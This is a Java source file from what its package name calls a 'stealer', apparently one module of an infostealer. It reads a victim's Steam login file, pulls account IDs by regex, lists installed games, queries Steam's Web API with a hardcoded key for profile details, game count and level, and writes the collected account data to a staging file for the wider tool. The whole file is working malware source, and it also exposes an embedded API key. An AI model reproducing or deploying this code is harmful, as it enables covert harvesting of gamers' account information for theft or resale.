package scruffy.stealer.impl.app;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.io.FileUtils;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import scruffy.stealer.utils.utilities;

public class steam extends utilities {

	public static String steam_level;

	public void initialize() {
		try {
			String steam = getSteam();
			if (!steam.contains("none")) {
		        File infoFile = new File(getFolder() + "/application/steam/account_info.txt");
                FileUtils.writeStringToFile(infoFile, steam, "utf-8", true);
                
				content.add("steam" + steam_level);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	   public static String getSteam() throws Exception {
	        File steamFolder = new File("C:/Program Files (x86)/Steam");
	        File loginUsersFile = new File("C:/Program Files (x86)/Steam/config/loginusers.vdf");

	        if (steamFolder.exists() && loginUsersFile.exists()) {
	            String accounts = FileUtils.readFileToString(loginUsersFile, StandardCharsets.UTF_8);
	            
	            Pattern pattern = Pattern.compile("7656[0-9]{13}");
	            Matcher matcher = pattern.matcher(accounts);

	            Gson gson = new Gson();
	            List<String> games = new ArrayList<>();

	            File gamesFolder = new File(System.getenv("ProgramFiles(X86)") + "/Steam/steamapps/");
	            File[] gameManifests = gamesFolder.listFiles(f -> f.getName().startsWith("appmanifest_"));
	            if (gameManifests != null) {
	                for (File game : gameManifests) {
	                    games.add(FileUtils.readFileToString(game, StandardCharsets.UTF_8).replaceAll("\\s+", " ").replaceAll(".*\"name\"\\s+\"([^\"]*)\".*", "$1"));
	                }
	            }

	            StringBuilder installedGames = new StringBuilder();
	            if (!games.isEmpty()) {
	                installedGames.append("\nInstalled Games: ").append(String.join(", ", games));
	            }

	            while (matcher.find()) {
	                String account = matcher.group();

	                HttpRequest accountInfoRequest = HttpRequest.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
	                if (!accountInfoRequest.ok()) 
	                	continue;

	                JsonObject accountInfo = gson.fromJson(accountInfoRequest.body(), JsonObject.class).getAsJsonObject("response").getAsJsonArray("players").get(0).getAsJsonObject();

	                HttpRequest gamesRequest = HttpRequest.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
	                if (!gamesRequest.ok()) 
	                	continue;

	                JsonObject gamesObj = gson.fromJson(gamesRequest.body(), JsonObject.class).getAsJsonObject("response");

	                HttpRequest levelRequest = HttpRequest.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
	                if (!levelRequest.ok()) 
	                	continue;

	                JsonObject level = gson.fromJson(levelRequest.body(), JsonObject.class).getAsJsonObject("response");

	                steam_level = level.has("player_level") ? String.valueOf(level.get("player_level").getAsInt()) : "Private";
	                return String.format("Steam Identifier: %s\nDisplay Name: %s\nTime created: %s\nLevel: %s\nGame count: %s%s\nProfile URL: %s", account, accountInfo.get("personaname").getAsString(), accountInfo.has("timecreated") ? accountInfo.get("timecreated").getAsString() : "Private", steam_level, gamesObj.has("game_count") ? gamesObj.get("game_count").getAsInt() : "Private", installedGames.toString(), accountInfo.get("profileurl").getAsString());
	            }
	        }
	        return "none";
	    }
	   
}